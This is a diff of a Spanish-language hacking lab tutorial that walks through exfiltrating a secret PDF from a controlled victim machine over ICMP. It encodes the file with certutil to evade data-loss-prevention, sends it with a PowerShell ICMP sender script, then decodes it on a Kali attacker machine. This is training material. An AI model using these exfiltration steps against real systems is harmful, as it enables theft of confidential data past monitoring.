@@ -57,7 +57,7 @@ Ejecutamos el servidor ***ICMP***. En la terminal escribimos.
 sudo python ~/eHacking_LABS/50/icmp_server.py
 ```
 
-## Ejercicio 3: Codificar el documento secreto.
+## Ejercicio 3: Codificar el documento secreto y enviarlo.
 
 Para ponérselo más difícil al sistema ***DPM*** vamos a codificar el documento en la máquina víctima (recordemos que el actor de la amenaza tiene su control). Para ello usaremos la herramienta ***CertUtil***.
 
@@ -69,7 +69,6 @@ certutil -encode TopSecret.pdf TopSecret.txt
 ```
 
 Podemos ver el documento codificado.
-Nota: ***CTRL+C*** cuando te aburras.
 ```
 cat TopSecret.txt
 ```
@@ -90,14 +89,48 @@ Cerramos ***Visual Studio Code*** y ejecutamos el script.
 .\ICMPSender.ps1
 ```
 
+## Ejercicio 4: Comprobar a exfiltración.
 
+El máquina ***Kali*** debemos tener descargado el ***archivoExfiltrado.txt***. Aún necesita postprocesado porque recordemos que ha sido codificado con ***CertUtil*** y hay que retirar la cabecera y el pie.
+```
+cd ~/eHacking/50
 
+sudo nano archivoExfiltrado.txt
+```
 
+Hay que ***eliminar*** la línea que se muestra en la imagen.
 
+![Begin Certificate](../img/lab-50-B/202209102223.png)
 
-TODO. PARA EL FINAL!!!!
+Luego pulsamos ***CTRL+W*** y escribimos en el buscador lo siguiente.
+```
+END CERTIFICATE
+```
 
-En la máquina ***Kali*** volvemos a habilitar la respuesta de ***ICMP***.
+Eliminamos el pie, tal y como señala la imagen.
+
+![End Certificate](../img/lab-50-B/202209102227.png)
+
+Guardamos con ***CTRL+X***, ***Y***. Antes de pulsar ***ENTER*** nos fijamos que el archivo está en formato ***DOS***. Tendrémos que convertirlo a ***Linux***.
+
+![DOS Format](../img/lab-50-B/202209102230.png)
+
+Pulsamos ***ENTER*** y en la terminal escribimos el siguiente comando.
+```
+sudo dos2unix archivoExfiltrado.txt
+```
+
+Por último lo descodificamos desde ***Base64*** (que es lo que hizo ***CertUtil***)
+```
+base64 -d archivoExfiltrado.txt > archivoExfiltrado.pdf
+```
+
+Ya solo queda ver el resultado.
+```
+open archivoExfiltrado.pdf
+```
+
+Para finalizar no olvidemos volver a habilitar la respuesta de ***ICMP***.
 ```
 sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
